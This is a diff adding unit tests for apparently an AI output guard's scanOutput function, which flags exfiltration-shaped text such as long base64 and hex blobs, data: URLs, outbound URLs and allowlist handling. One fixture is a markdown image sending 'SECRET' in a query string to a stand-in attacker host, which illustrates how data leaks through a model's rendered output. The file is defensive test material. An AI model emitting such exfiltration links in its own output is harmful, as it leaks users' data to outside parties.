@@ -1,4 +1,9 @@
-import { generateCanary, createOutputValidator, createGuard } from "./index";
+import {
+  generateCanary,
+  createOutputValidator,
+  createGuard,
+  scanOutput,
+} from "./index";
 
 // ── generateCanary() ─────────────────────────────────────────────────
 
@@ -624,5 +629,213 @@ describe("Output edge cases", () => {
   test("output with only numbers is safe", () => {
     const result = validator.validate("42 100 200 300");
     expect(result.safe).toBe(true);
+  });
+});
+
+// ── Output scanning (exfiltration shapes) ────────────────────────────
+
+describe("scanOutput", () => {
+  describe("base64-blob", () => {
+    test("flags 120+ char base64 run", () => {
+      const blob = "A".repeat(125); // 125 chars — over the 120 gate
+      const result = scanOutput(`Here is some data: ${blob} end`);
+      const f = result.findings.find((x) => x.type === "base64-blob");
+      expect(f).toBeDefined();
+      expect(result.safe).toBe(false);
+      expect(f!.preview.length).toBeLessThanOrEqual(60);
+      expect(typeof f!.offset).toBe("number");
+    });
+
+    test("does not flag short base64-like runs (under 120 chars)", () => {
+      const blob = "A".repeat(64);
+      const result = scanOutput(`Small: ${blob}`);
+      // The hex-blob pattern could trigger on "A*64" — but we're only
+      // asserting base64-blob here.
+      const base64Findings = result.findings.filter(
+        (f) => f.type === "base64-blob"
+      );
+      expect(base64Findings).toHaveLength(0);
+    });
+
+    test("preview truncates to 60 characters", () => {
+      const blob = "A".repeat(200);
+      const result = scanOutput(blob);
+      const f = result.findings.find((x) => x.type === "base64-blob");
+      expect(f).toBeDefined();
+      expect(f!.preview.length).toBe(60);
+    });
+  });
+
+  describe("markdown-image-with-query", () => {
+    test("flags markdown image with querystring", () => {
+      const text = "Result: ![pic](https://attacker.com/collect?data=SECRET)";
+      const result = scanOutput(text);
+      const f = result.findings.find(
+        (x) => x.type === "markdown-image-with-query"
+      );
+      expect(f).toBeDefined();
+      expect(result.safe).toBe(false);
+    });
+
+    test("does not flag markdown image without querystring", () => {
+      const text = "![logo](https://example.com/logo.png)";
+      const result = scanOutput(text);
+      const mdFindings = result.findings.filter(
+        (f) => f.type === "markdown-image-with-query"
+      );
+      expect(mdFindings).toHaveLength(0);
+    });
+  });
+
+  describe("outbound-url", () => {
+    test("flags plain http URL", () => {
+      const result = scanOutput("Click http://evil.com here");
+      const f = result.findings.find((x) => x.type === "outbound-url");
+      expect(f).toBeDefined();
+      expect(result.safe).toBe(false);
+    });
+
+    test("flags plain https URL", () => {
+      const result = scanOutput("Visit https://attacker.example.com/path");
+      const f = result.findings.find((x) => x.type === "outbound-url");
+      expect(f).toBeDefined();
+    });
+
+    test("allowedOrigins suppresses matching host", () => {
+      const guard = createGuard({ allowedOrigins: ["example.com"] });
+      const result = guard.scanOutput("See https://example.com/help");
+      const urls = result.findings.filter((f) => f.type === "outbound-url");
+      expect(urls).toHaveLength(0);
+    });
+
+    test("allowedOrigins suppresses subdomain (suffix match)", () => {
+      const guard = createGuard({ allowedOrigins: ["example.com"] });
+      const result = guard.scanOutput("See https://api.example.com/x");
+      const urls = result.findings.filter((f) => f.type === "outbound-url");
+      expect(urls).toHaveLength(0);
+    });
+
+    test("allowedOrigins does not accidentally match look-alike hosts", () => {
+      // "notexample.com" must NOT be suppressed by an "example.com" allowlist.
+      const guard = createGuard({ allowedOrigins: ["example.com"] });
+      const result = guard.scanOutput("See https://notexample.com/x");
+      const urls = result.findings.filter((f) => f.type === "outbound-url");
+      expect(urls.length).toBeGreaterThanOrEqual(1);
+    });
+
+    test("allowedOrigins allows multiple entries", () => {
+      const guard = createGuard({
+        allowedOrigins: ["docs.example.com", "help.another.com"],
+      });
+      const result = guard.scanOutput(
+        "Docs https://docs.example.com and help https://help.another.com"
+      );
+      const urls = result.findings.filter((f) => f.type === "outbound-url");
+      expect(urls).toHaveLength(0);
+    });
+
+    test("standalone scanOutput has empty allowlist", () => {
+      // No `createGuard`, so no allowlist — every URL is flagged.
+      const result = scanOutput("See https://example.com/help");
+      const urls = result.findings.filter((f) => f.type === "outbound-url");
+      expect(urls).toHaveLength(1);
+    });
+
+    test("leading-dot allowlist entry matches subdomains but NOT apex", () => {
+      const guard = createGuard({ allowedOrigins: [".example.com"] });
+      // Subdomain is allowed (passes through, not flagged)
+      const sub = guard.scanOutput("See https://assets.example.com/help");
+      expect(sub.findings.filter((f) => f.type === "outbound-url")).toHaveLength(0);
+      // Apex is still flagged (leading-dot entry excludes it by design)
+      const apex = guard.scanOutput("See https://example.com/help");
+      expect(apex.findings.filter((f) => f.type === "outbound-url")).toHaveLength(1);
+    });
+
+    test("bare allowlist entry matches apex and subdomains", () => {
+      const guard = createGuard({ allowedOrigins: ["example.com"] });
+      const apex = guard.scanOutput("See https://example.com/help");
+      expect(apex.findings.filter((f) => f.type === "outbound-url")).toHaveLength(0);
+      const sub = guard.scanOutput("See https://assets.example.com/help");
+      expect(sub.findings.filter((f) => f.type === "outbound-url")).toHaveLength(0);
+    });
+  });
+
+  describe("data-url", () => {
+    test("flags data: URL with base64", () => {
+      const result = scanOutput("Here: data:image/png;base64,iVBORw0KG");
+      const f = result.findings.find((x) => x.type === "data-url");
+      expect(f).toBeDefined();
+      expect(result.safe).toBe(false);
+    });
+
+    test("does not flag plain data: without base64", () => {
+      // "data:text/plain," — no base64 — should not match.
+      const result = scanOutput("Use data:text/plain,HelloWorld");
+      const dataFindings = result.findings.filter((f) => f.type === "data-url");
+      expect(dataFindings).toHaveLength(0);
+    });
+  });
+
+  describe("hex-blob", () => {
+    test("flags 64+ hex chars", () => {
+      const hex = "a".repeat(80);
+      const result = scanOutput(`Hash: ${hex} end`);
+      const f = result.findings.find((x) => x.type === "hex-blob");
+      expect(f).toBeDefined();
+      expect(result.safe).toBe(false);
+    });
+
+    test("does not flag short hex strings", () => {
+      const result = scanOutput("Short: abc123");
+      const hexFindings = result.findings.filter((f) => f.type === "hex-blob");
+      expect(hexFindings).toHaveLength(0);
+    });
+  });
+
+  describe("clean output", () => {
+    test("safe when no exfil-shape patterns present", () => {
+      const result = scanOutput("This is a normal helpful response.");
+      expect(result.safe).toBe(true);
+      expect(result.findings).toHaveLength(0);
+    });
+
+    test("empty string is safe", () => {
+      expect(scanOutput("").safe).toBe(true);
+    });
+
+    test("offsets are accurate", () => {
+      const blob = "A".repeat(125);
+      const prefix = "prefix text ";
+      const result = scanOutput(prefix + blob);
+      const f = result.findings.find((x) => x.type === "base64-blob");
+      expect(f!.offset).toBe(prefix.length);
+    });
+  });
+
+  describe("multiple findings", () => {
+    test("reports multiple finding types in one scan", () => {
+      const text = [
+        "Check https://evil.com",
+        "blob: " + "A".repeat(130),
+        "img: ![p](https://x.com/c?d=1)",
+      ].join(" ");
+      const result = scanOutput(text);
+      const types = new Set(result.findings.map((f) => f.type));
+      expect(types.has("outbound-url")).toBe(true);
+      expect(types.has("base64-blob")).toBe(true);
+      expect(types.has("markdown-image-with-query")).toBe(true);
+    });
+  });
+
+  describe("URL parse fallback (defense-in-depth)", () => {
+    test("unparseable URL still produces a finding (not silently skipped)", () => {
+      // `https://[invalid` matches the outbound-url regex but throws inside
+      // `new URL(...)`. Our extractHost returns null and the finding must
+      // still be recorded — the conservative choice for a defense tool.
+      const guard = createGuard({ allowedOrigins: ["example.com"] });
+      const result = guard.scanOutput("See https://[invalid");
+      const urls = result.findings.filter((f) => f.type === "outbound-url");
+      expect(urls.length).toBeGreaterThanOrEqual(1);
+    });
   });
 });
